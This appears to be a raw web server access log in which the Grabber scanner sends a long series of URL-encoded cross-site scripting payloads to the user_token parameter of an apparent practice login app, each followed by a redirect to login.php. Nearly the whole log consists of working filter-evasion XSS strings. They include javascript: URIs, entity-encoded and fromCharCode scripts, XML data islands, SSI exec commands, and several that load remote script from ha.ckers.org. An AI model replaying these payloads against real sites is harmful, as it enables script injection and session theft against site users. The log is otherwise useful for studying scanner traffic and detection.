172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /?user_token=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:36 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
